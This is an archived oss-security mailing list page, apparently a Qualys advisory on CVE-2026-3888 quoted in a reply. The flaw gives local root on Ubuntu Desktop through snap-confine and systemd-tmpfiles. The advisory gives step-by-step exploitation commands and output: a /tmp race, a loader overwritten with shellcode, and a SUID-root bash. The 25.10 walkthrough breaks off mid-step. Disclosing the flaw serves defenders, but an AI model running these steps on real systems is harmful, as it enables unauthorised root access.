@@ -1,0 +1,1000 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: snap-confine + systemd-tmpfiles = root (CVE-2026-3888)</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="8">[&lt;prev]</a> <a href="10">[next&gt;]</a> <a href="8">[&lt;thread-prev]</a> <a href="../../../2026/03/18/1">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;CALx_OUC5-oQsU630zpth=pCShZ+cT6jEBTnpxnRDMHa3TYjkKg&#64;mail.gmail.com&gt;
+Date: Tue, 17 Mar 2026 13:58:17 -0600
+From: Michal Zalewski &lt;lcamtuf&#64;...edump.cx&gt;
+To: oss-security&#64;...ts.openwall.com, qsa&#64;...lys.com
+Subject: Re: snap-confine + systemd-tmpfiles = root (CVE-2026-3888)
+
+Nice work... flashbacks from 2002
+(<a href="https://lcamtuf.coredump.cx/tmp_paper.txt" rel="nofollow">https://lcamtuf.coredump.cx/tmp_paper.txt</a>). It's frankly somewhat
+mind-boggling that distros keep a world-writable /tmp this day and
+age. Whatever questionable benefits it has, it also contributed to
+plenty of pointless and easily avoidable vulns.
+
+/mz
+
+On Tue, Mar 17, 2026 at 1:35 PM Qualys Security Advisory &lt;qsa&#64;...lys.com&gt; wrote:
+&gt;
+&gt;
+&gt; Qualys Security Advisory
+&gt;
+&gt; Good things come to those who wait:
+&gt; snap-confine + systemd-tmpfiles = root (CVE-2026-3888)
+&gt;
+&gt;
+&gt; ========================================================================
+&gt; Contents
+&gt; ========================================================================
+&gt;
+&gt; Summary
+&gt; Case study: Ubuntu Desktop 24.04
+&gt; - Analysis
+&gt; - Exploitation
+&gt; Case study: Ubuntu Desktop 25.10
+&gt; - Overview
+&gt; - Exploitation
+&gt; A quick note on the uutils coreutils (the rust-coreutils)
+&gt; Acknowledgments
+&gt; Timeline
+&gt;
+&gt;     And that is why Caterpillar was never in a hurry.
+&gt;     She knew that good things come to those who wait.
+&gt;         -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
+&gt;
+&gt;
+&gt; ========================================================================
+&gt; Summary
+&gt; ========================================================================
+&gt;
+&gt; We discovered an unusual Local Privilege Escalation (LPE), from any
+&gt; unprivileged user to full root, in the default installation of Ubuntu
+&gt; Desktop &gt;= 24.04. We found this vulnerability particularly interesting:
+&gt;
+&gt; a/ it stems from the interaction of two otherwise secure programs:
+&gt;
+&gt; - snap-confine, which is set-user-ID-root (or set-capabilities), and
+&gt;   "used internally by snapd to construct the execution environment for
+&gt;   snap applications" (man snap-confine);
+&gt;
+&gt; - systemd-tmpfiles, which is executed as root once per day, and
+&gt;   "creates, deletes, and cleans up files and directories, using the
+&gt;   configuration file format and location specified in tmpfiles.d(5)"
+&gt;   (man systemd-tmpfiles);
+&gt;
+&gt; b/ an unprivileged local attacker who wants to exploit this LPE must
+&gt; wait for 10 days (in Ubuntu &gt; 24.04) or 30 days (in Ubuntu 24.04) to
+&gt; obtain a fully privileged root shell.
+&gt;
+&gt; As a side note, we also discovered a local vulnerability (a race
+&gt; condition) in the uutils coreutils (a Rust rewrite of the standard GNU
+&gt; coreutils -- ls, cp, rm, cat, sort, etc), which are installed by default
+&gt; in Ubuntu 25.10. This vulnerability was mitigated in Ubuntu 25.10 before
+&gt; its release (by replacing the uutils coreutils' rm with the standard GNU
+&gt; coreutils' rm), and would otherwise have resulted in an LPE (from any
+&gt; unprivileged user to full root) in the default installation of Ubuntu
+&gt; Desktop 25.10.
+&gt;
+&gt;
+&gt; ========================================================================
+&gt; Case study: Ubuntu Desktop 24.04
+&gt; ========================================================================
+&gt;
+&gt;     Go slow, go slow,
+&gt;     If you want to grow.
+&gt;         -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
+&gt;
+&gt; ________________________________________________________________________
+&gt;
+&gt; Analysis
+&gt; ________________________________________________________________________
+&gt;
+&gt; We recently noticed that, in the default installation of Ubuntu since
+&gt; version 24.04, systemd-tmpfiles is configured to automatically clean up
+&gt; the files and directories in /tmp that are older than 30 days (in Ubuntu
+&gt; 24.04) or 10 days (in Ubuntu &gt; 24.04). More precisely, systemd-tmpfiles
+&gt; traverses /tmp once per day and deletes all the files and directories
+&gt; that have not been accessed nor modified for more than 10 or 30 days.
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; $ cat /etc/os-release
+&gt; PRETTY_NAME="Ubuntu 24.04.3 LTS"
+&gt; ...
+&gt;
+&gt; $ cat /usr/lib/tmpfiles.d/tmp.conf
+&gt; ...
+&gt; D /tmp 1777 root root 30d
+&gt; #q /var/tmp 1777 root root 30d
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; $ cat /etc/os-release
+&gt; PRETTY_NAME="Ubuntu 25.10"
+&gt; ...
+&gt;
+&gt; $ cat /usr/lib/tmpfiles.d/tmp.conf
+&gt; ...
+&gt; q /tmp 1777 root root 10d
+&gt; q /var/tmp 1777 root root 30d
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; From our "Lemmings" and "Leeloo" advisories, we then remembered that
+&gt; snap-confine does highly privileged work in /tmp; in particular, in the
+&gt; /tmp/snap-private-tmp directory, which is securely created at boot time
+&gt; (as user root, mode 0700):
+&gt;
+&gt;   <a href="https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt" rel="nofollow">https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt</a>
+&gt;   <a href="https://www.qualys.com/2022/11/30/cve-2022-3328/advisory-snap.txt" rel="nofollow">https://www.qualys.com/2022/11/30/cve-2022-3328/advisory-snap.txt</a>
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; $ cat /usr/lib/tmpfiles.d/snapd.conf
+&gt; D! /tmp/snap-private-tmp 0700 root root -
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; We therefore came up with the following idea: if, unbeknownst to
+&gt; snap-confine, systemd-tmpfiles deletes one of the files or directories
+&gt; from snap-confine's /tmp/snap-private-tmp, can we (an unprivileged local
+&gt; attacker) re-create the deleted file or directory ourselves, and exploit
+&gt; snap-confine's privileged work to obtain a fully privileged root shell?
+&gt;
+&gt; Still from our "Lemmings" and "Leeloo" advisories, we also remembered
+&gt; that, to set up a snap's sandbox, snap-confine creates a directory named
+&gt; /tmp/snap-private-tmp/$SNAP/tmp (as user root, mode 01777) that is later
+&gt; bind-mounted onto the /tmp directory inside the snap's sandbox.
+&gt;
+&gt; And inside this /tmp directory (inside the snap's sandbox), snap-confine
+&gt; creates a directory named /tmp/.snap (as user root, mode 0755) to create
+&gt; "mimics"; for example, inside the sandbox of each and every snap that is
+&gt; installed by default on Ubuntu Desktop, snap-confine bind-mounts the
+&gt; /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 directory:
+&gt;
+&gt; - to bind-mount this directory, snap-confine must first create its
+&gt;   /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 mountpoint, which does not
+&gt;   normally exist;
+&gt;
+&gt; - but inside the snap's sandbox, /usr/lib/x86_64-linux-gnu is in a
+&gt;   read-only filesystem (the "core22" base's squashfs);
+&gt;
+&gt; - so snap-confine must first create a "mimic" of
+&gt;   /usr/lib/x86_64-linux-gnu (a writable copy of
+&gt;   /usr/lib/x86_64-linux-gnu), by:
+&gt;
+&gt; 1/ bind-mounting the original, read-only /usr/lib/x86_64-linux-gnu onto
+&gt; /tmp/.snap/usr/lib/x86_64-linux-gnu (inside the snap's sandbox);
+&gt;
+&gt; 2/ mounting a new, writable tmpfs onto /usr/lib/x86_64-linux-gnu;
+&gt;
+&gt; 3/ bind-mounting every file and directory from
+&gt; /tmp/.snap/usr/lib/x86_64-linux-gnu back into /usr/lib/x86_64-linux-gnu;
+&gt;
+&gt; 4/ creating the /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 mountpoint
+&gt; (which is in a writable tmpfs now);
+&gt;
+&gt; 5/ finally bind-mounting
+&gt; /snap/firefox/6565/gnome-platform/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0
+&gt; (for example) onto /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0.
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; $ grep /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 /var/lib/snapd/mount/*
+&gt; /var/lib/snapd/mount/snap.firefox.fstab:/snap/firefox/6565/gnome-platform/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 none rbind,rw,x-snapd.origin=layout 0 0
+&gt; ...
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Consequently, our theoretical idea to exploit snap-confine is:
+&gt;
+&gt; - inside the snap's sandbox, we frequently write to the /tmp directory
+&gt;   (but not to /tmp/.snap), and patiently wait for systemd-tmpfiles to
+&gt;   delete the unmodified /tmp/.snap directory (but not /tmp) after 10
+&gt;   days (in Ubuntu &gt; 24.04) or 30 days (in Ubuntu 24.04);
+&gt;
+&gt; - we re-create the /tmp/.snap directory ourselves (indeed, /tmp is
+&gt;   world-writable), and create our own copy of /usr/lib/x86_64-linux-gnu
+&gt;   in /tmp/.snap/usr/lib/x86_64-linux-gnu.exchange;
+&gt;
+&gt; - we force snap-confine to set up the snap's sandbox afresh, but during
+&gt;   the creation of the /usr/lib/x86_64-linux-gnu "mimic", between step 1/
+&gt;   and step 3/, we quickly replace /tmp/.snap/usr/lib/x86_64-linux-gnu
+&gt;   with our own /tmp/.snap/usr/lib/x86_64-linux-gnu.exchange (indeed,
+&gt;   /tmp/.snap belongs to us);
+&gt;
+&gt; - as a result, during step 3/ of the creation of this "mimic",
+&gt;   snap-confine bind-mounts our own files into /usr/lib/x86_64-linux-gnu,
+&gt;   so we control every shared library and the dynamic loader (inside the
+&gt;   snap's sandbox) and can execute arbitrary code as root by simply
+&gt;   executing any dynamically-linked SUID-root binary.
+&gt;
+&gt; In the following proof of concept for Ubuntu Desktop 24.04, we put this
+&gt; theoretical idea into practice.
+&gt;
+&gt; ________________________________________________________________________
+&gt;
+&gt; Exploitation
+&gt; ________________________________________________________________________
+&gt;
+&gt; First, we set up the sandbox of one of the snaps that are installed by
+&gt; default on Ubuntu Desktop (the "firefox" snap) by executing snap-confine
+&gt; with the "core22" base, then we obtain an unprivileged shell inside this
+&gt; snap's sandbox, we chdir to its /tmp directory, we frequently write to
+&gt; this directory (but not to its /tmp/.snap sub-directory), and we wait
+&gt; for systemd-tmpfiles to delete the unmodified /tmp/.snap directory
+&gt; (after 30 days, in Ubuntu 24.04).
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ cat /etc/os-release
+&gt; PRETTY_NAME="Ubuntu 24.04.3 LTS"
+&gt; ...
+&gt;
+&gt; outside$ id
+&gt; uid=1001(jane) gid=1001(jane) groups=1001(jane),100(users)
+&gt;
+&gt; outside$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
+&gt;
+&gt; inside$ cd /tmp
+&gt;
+&gt; inside$ stat ./.snap
+&gt; ...
+&gt; Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+&gt; ...
+&gt;
+&gt; inside$ while test -d ./.snap; do touch ./; sleep 60; done
+&gt; [30 days pass]
+&gt;
+&gt; inside$ stat ./.snap
+&gt; stat: cannot statx './.snap': No such file or directory
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Second, from another shell outside the snap's sandbox, we chdir to
+&gt; /tmp/snap-private-tmp/$SNAP/tmp (/tmp inside the snap's sandbox) through
+&gt; the /proc/pid/cwd of our sandboxed shell (indeed, we cannot chdir to
+&gt; /tmp/snap-private-tmp/$SNAP/tmp directly because /tmp/snap-private-tmp
+&gt; belongs to root, mode 0700), we destroy the snap's sandbox (but not its
+&gt; /tmp directory) by executing snap-confine with an invalid base (the
+&gt; "snapd" base), and we run our firefox_24.04.c helper (which is basically
+&gt; CVE-2021-44731-Desktop.c from our "Lemmings" advisory):
+&gt;
+&gt; - we re-create the ./.snap directory ourselves (/tmp/.snap inside the
+&gt;   snap's sandbox), since it was deleted by systemd-tmpfiles, and we
+&gt;   create our own copy of /snap/core22/current/usr/lib/x86_64-linux-gnu
+&gt;   in ./.snap/usr/lib/x86_64-linux-gnu.exchange;
+&gt;
+&gt; - we force snap-confine to set up the snap's sandbox afresh, by
+&gt;   executing it with the "core22" base, but we "single-step" this
+&gt;   execution of snap-confine (we set SNAPD_DEBUG=1, we redirect its
+&gt;   stderr to an AF_UNIX socket with minimized SO_RCVBUF and SO_SNDBUF, we
+&gt;   read() its output byte by byte, and we recv(MSG_PEEK) at its buffered
+&gt;   output), to reliably win the race condition between step 1/ and step
+&gt;   3/ of the "mimic" creation of /usr/lib/x86_64-linux-gnu;
+&gt;
+&gt; - as soon as we read() or recv() the following message (immediately
+&gt;   after step 1/ of the "mimic" creation of /usr/lib/x86_64-linux-gnu),
+&gt;
+&gt;   mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.snap/usr/lib/x86_64-linux-gnu"
+&gt;
+&gt;   we quickly replace snap-confine's ./.snap/usr/lib/x86_64-linux-gnu
+&gt;   with our own ./.snap/usr/lib/x86_64-linux-gnu.exchange, whose contents
+&gt;   are then bind-mounted into /usr/lib/x86_64-linux-gnu, thus giving us
+&gt;   full control over every shared library and the dynamic loader inside
+&gt;   the snap's sandbox.
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ cd /proc/2396/cwd
+&gt;
+&gt; outside$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
+&gt; /user.slice/user-1001.slice/session-145.scope is not a snap cgroup
+&gt;
+&gt; outside$ systemd-run --user --scope --unit=snap.whatever /bin/bash
+&gt; Running as unit: snap.whatever.scope; invocation ID: ed50ae80aa9844d6a6e4499ea1f4bba8
+&gt;
+&gt; outside$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
+&gt; cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_yMpga4//dev: No such file or directory
+&gt;
+&gt; outside$ exit
+&gt;
+&gt; outside$ ~/firefox_24.04
+&gt; hange.go:351: DEBUG: mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.snap/usr/lib/x86_64-linux-gnu" type:"" opts:MS_BIND|MS_REC unparsed:"" (error: &lt;nil&gt;)
+&gt; change.go:351: DEBUG: mount name:"tmpfs" dir:"/usr/lib/x86_64-linux-gnu" type:"tmpfs" opts: unparsed:"mode=0755,uid=0,gid=0" (error: &lt;nil&gt;)
+&gt; ...
+&gt; change.go:351: DEBUG: mount name:"/tmp/.snap/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" dir:"/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" type:"" opts:MS_BIND unparsed:"" (error: &lt;nil&gt;)
+&gt; ...
+&gt; change.go:351: DEBUG: mount name:"/snap/firefox/6565/gnome-platform/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0" dir:"/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0" type:"none" opts:MS_BIND|MS_REC unparsed:"" (error: &lt;nil&gt;)
+&gt; ...
+&gt; execv failed: No such file or directory
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Third, we obtain an unprivileged shell inside this newly set up sandbox,
+&gt; by executing snap-confine with the same "core22" base; and from another
+&gt; shell outside this snap's sandbox, we chdir to its / directory, through
+&gt; the /proc/pid/root of our sandboxed shell, we copy /usr/bin/busybox to
+&gt; ./tmp/sh (/tmp/sh inside the snap's sandbox), and we overwrite the
+&gt; dynamic loader ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 (which
+&gt; belongs to us) with a simple shellcode that calls setreuid(0) and
+&gt; execve(/tmp/sh) (a busybox shell).
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
+&gt; inside$
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ cd /proc/4516/root
+&gt;
+&gt; outside$ cp /usr/bin/busybox ./tmp/sh
+&gt;
+&gt; outside$ cat ~/librootshell.so &gt; ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Fourth, we obtain a root shell inside the snap's sandbox, by executing
+&gt; snap-confine itself through snap-confine, which is dynamically linked
+&gt; and SUID-root and therefore executes our own dynamic loader's shellcode
+&gt; (and hence a busybox shell) as root. (Note: the snap's sandbox contains
+&gt; various SUID-root binaries, but only the execution of snap-confine is
+&gt; allowed by its AppArmor profile.)
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
+&gt; ...
+&gt; BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
+&gt; ...
+&gt;
+&gt; inside# id
+&gt; uid=0(root) gid=1001(jane) groups=100(users),1001(jane)
+&gt; ^^^^^^^^^^^
+&gt;
+&gt; inside# cat /etc/shadow
+&gt; cat: can't open '/etc/shadow': Permission denied
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Fifth, because this root shell is still inside the snap's sandbox,
+&gt; confined by an AppArmor profile and a seccomp filter, we copy /bin/bash
+&gt; to /var/snap/$SNAP/common/ and chmod it to 04755 (both operations are
+&gt; allowed by the AppArmor profile and the seccomp filter), and execute
+&gt; this SUID-root shell from outside the snap's sandbox, thereby finally
+&gt; gaining full root privileges.
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; inside# cp /bin/bash /var/snap/firefox/common/
+&gt;
+&gt; inside# chmod 04755 /var/snap/firefox/common/bash
+&gt;
+&gt; inside# exit
+&gt;
+&gt; outside$ /var/snap/firefox/common/bash -p
+&gt;
+&gt; outside# id
+&gt; uid=1001(jane) gid=1001(jane) euid=0(root) groups=1001(jane),100(users)
+&gt;                               ^^^^^^^^^^^^
+&gt;
+&gt; outside# cat /etc/shadow
+&gt; root:*:20305:0:99999:7:::
+&gt; daemon:*:20305:0:99999:7:::
+&gt; ...
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt;
+&gt; ========================================================================
+&gt; Case study: Ubuntu Desktop 25.10
+&gt; ========================================================================
+&gt;
+&gt;     Why go fast?
+&gt;     Let life run past?
+&gt;         -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
+&gt;
+&gt; ________________________________________________________________________
+&gt;
+&gt; Overview
+&gt; ________________________________________________________________________
+&gt;
+&gt; For Ubuntu Desktop 25.10 we must change our exploitation strategy,
+&gt; because snap-confine is not SUID-root anymore; instead, it now has
+&gt; capabilities attached:
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; $ stat /usr/lib/snapd/snap-confine
+&gt; ...
+&gt; Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+&gt; ...
+&gt;
+&gt; $ getcap /usr/lib/snapd/snap-confine
+&gt; /usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; These capabilities are actually very powerful, and we can obtain them
+&gt; inside a snap's sandbox by slightly revising our exploitation strategy
+&gt; from Ubuntu 24.04 (by calling capset() and prctl(PR_CAP_AMBIENT_RAISE)
+&gt; instead of setreuid(0)), but most of these capabilities and associated
+&gt; syscalls are then denied to us by AppArmor and seccomp, thus preventing
+&gt; us from gaining full root privileges outside the snap's sandbox.
+&gt;
+&gt; Consequently, we decided to re-use the strategy that we used in our
+&gt; "Lemmings" advisory to exploit the "snap-store" snap (which is installed
+&gt; by default on Ubuntu Desktop): instead of racing against the "mimic"
+&gt; creation of /usr/lib/x86_64-linux-gnu, we race against the "mimic"
+&gt; creation of /var/lib (which is needed to bind-mount /var/lib/app-info
+&gt; inside snap-store's sandbox), which allows us to control /var/lib and
+&gt; hence /var/lib/snapd/mount/snap.snap-store.user-fstab, which in turn
+&gt; allows us to bind-mount near-arbitrary directories and obtain a root
+&gt; shell inside snap-store's sandbox, and eventually a fully privileged
+&gt; root shell outside snap-store's sandbox.
+&gt;
+&gt; ________________________________________________________________________
+&gt;
+&gt; Exploitation
+&gt; ________________________________________________________________________
+&gt;
+&gt; First, we set up snap-store's sandbox by executing snap-confine with the
+&gt; "core22" base, we obtain an unprivileged shell inside this sandbox, we
+&gt; chdir to its /tmp directory, we frequently write to this directory (but
+&gt; not to its /tmp/.snap sub-directory), and we wait for systemd-tmpfiles
+&gt; to delete the unmodified /tmp/.snap directory (after 10 days, in Ubuntu
+&gt; 25.10).
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ cat /etc/os-release
+&gt; PRETTY_NAME="Ubuntu 25.10"
+&gt; ...
+&gt;
+&gt; outside$ id
+&gt; uid=1001(jane) gid=1001(jane) groups=1001(jane),100(users)
+&gt;
+&gt; outside$ env -i SNAP_INSTANCE_NAME=snap-store /usr/lib/snapd/snap-confine --base core22 snap.snap-store.hook.configure /bin/bash
+&gt;
+&gt; inside$ cd /tmp
+&gt;
+&gt; inside$ stat ./.snap
+&gt; ...
+&gt; Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+&gt; ...
+&gt;
+&gt; inside$ while test -d ./.snap; do touch ./; sleep 60; done
+&gt; [10 days pass]
+&gt;
+&gt; inside$ stat ./.snap
+&gt; stat: cannot statx './.snap': No such file or directory
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Second, from another shell outside snap-store's sandbox, we chdir to
+&gt; /tmp/snap-private-tmp/$SNAP/tmp (/tmp inside the sandbox) through the
+&gt; /proc/pid/cwd of our sandboxed shell, we destroy snap-store's sandbox
+&gt; (but not its /tmp directory) by executing snap-confine with an invalid
+&gt; base ("snapd"), and we run our snap-store_25.10.c helper (which is also
+&gt; basically CVE-2021-44731-Desktop.c from our "Lemmings" advisory):
+&gt;
+&gt; - we re-create the ./.snap directory ourselves (/tmp/.snap inside
+&gt;   snap-store's sandbox), since it was deleted by systemd-tmpfiles, and
+&gt;   we create our own copy of /snap/core22/current/var/lib in
+&gt;   ./.snap/var/lib.exchange;
+&gt;
+&gt; - we force snap-confine to set up snap-store's sandbox afresh, by
+&gt;   executing it with the "core22" base, but we "single-step" this
+&gt;   execution (with SNAPD_DEBUG=1), to reliably win the race condition
+&gt;   between step 1/ and step 3/ of the "mimic" creation of /var/lib;
+&gt;
+&gt; - as soon as we see the following debug message (immediately after step
+&gt;   1/ of the "mimic" creation of /var/lib),
+&gt;
+&gt;   mount name:"/var/lib" dir:"/tmp/.snap/var/lib"
+&gt;
+&gt;   we quickly replace snap-confine's ./.snap/var/lib with our own
+&gt;   ./.snap/var/lib.exchange, whose contents are then bind-mounted into
+&gt;   /var/lib (inside snap-store's sandbox); this replacement has two
+&gt;   beneficial consequences for us:
+&gt;
+&gt;   a/ we control /var/lib/snapd/mount/snap.snap-store.user-fstab, which
+&gt;   allows us to bind-mount near-arbitrary directories inside snap-store's
+&gt;   sandbox (these bind-mounts are not completely arbitrary, because they
+&gt;   are still confined by an AppArmor profile);
+&gt;
+&gt;   b/ various SUID-root binaries remain bind-mounted in /tmp/.snap, and
+&gt;   their execution is allowed by an AppArmor rule "/tmp/** mrwlkix,"
+&gt;   inside snap-store's sandbox.
+&gt;
+&gt; ------------------------------------------------------------------------
+&gt; outside$ cd /proc/4078/cwd
+&gt;
+&gt; outside$ env -i SNAP_INSTANCE_NAME=snap-store /usr/lib/snapd/snap-confine --base snapd snap.snap-store.hook.configure /nonexistent
+&gt; /user.slice/user-1001.slice/session-33.scope is not a snap cgroup
+&gt;
+&gt; outside$ systemd-run --user --scope --unit=snap.whatever /bin/bash
+&gt; Running as unit: snap.whatever.scope; invocation ID: 113af972356b4f08a58461cf64cc57f6
+&gt;
+&gt; outside$ env -i SNAP_INSTANCE_NAME=snap-store /usr/lib/snapd/snap-confine --base snapd snap.snap-store.hook.configure /nonexistent
+&gt; cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_GCNDEM//dev: No such file or directory
+&gt;
+&gt; outside$ exit
+&gt;
+&gt; outside$ ~/snap-store_25.10
+&gt; ...
+&gt; hange.go:351: DEBUG: mount name:"/var/lib" dir:"/tmp/.snap/var/lib" type:"" opts:MS_BIND|MS_REC unparsed:"" (error: &lt;nil&gt;)
+&gt; change.go:351: DEBUG: mount name:"tmpfs" dir:"/var/lib" type:"tmpfs" opts: unparsed:"mode=0755,uid=0,gid=0" (error: &lt;nil&gt;)
+&gt; ...
+&gt; change.go:426: DEBUG: umount "/tmp/.snap/var/lib" UMOUNT_NOFOLLOW|MNT_DETACH (error: invalid argument)
+&gt; change.go:399: DEBUG: ignoring EINVAL from unmount, "/tmp/.snap/var/lib" is not mounted
+&gt; change.go:477: DEBUG: remove "/tmp/.snap/var/lib" (error: remove /tmp/.snap/var/lib: directory not empty)
+&gt; ...
+&gt; /var/lib/snapd not root-owned 1001:1001
+&gt; ------------------------------------------------------------------------
+&gt;
+&gt; Third, still from outside snap-store's sandbox but inside its /tmp
+&gt; directory:
+&gt;
+&gt; - we create a copy of /etc in ./.snap/etc (/tmp/.snap/etc inside the
+&gt;   sandbox), we add /tmp/librootshell.so to ./.snap/etc/ld.so.preload, we
